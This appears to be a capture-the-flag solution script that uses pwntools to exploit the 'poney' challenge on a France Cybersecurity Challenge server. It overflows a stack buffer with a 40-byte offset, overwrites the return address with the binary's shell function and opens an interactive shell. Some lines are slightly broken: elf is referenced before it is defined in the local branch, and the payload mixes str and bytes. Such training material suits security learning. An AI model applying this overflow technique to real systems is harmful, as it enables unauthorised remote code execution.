import pwn

remote = True

if remote:
    io = pwn.remote('challenges1.france-cybersecurity-challenge.fr', 4000)
else:
    io = pwn.process(elf.path)

pwn.context.log_level = 'debug'

elf = pwn.context.binary = pwn.ELF('poney')
offset = 40
shell = pwn.p64(elf.symbols.shell)
payload = "A"*offset + shell

pwn.info("Shell address: %#x ", elf.symbols.shell)
pwn.info("Little Endian shell address: %s ", shell)
pwn.info("Payload: %s ", payload)

io.sendline(payload)
io.interactive()
io.close()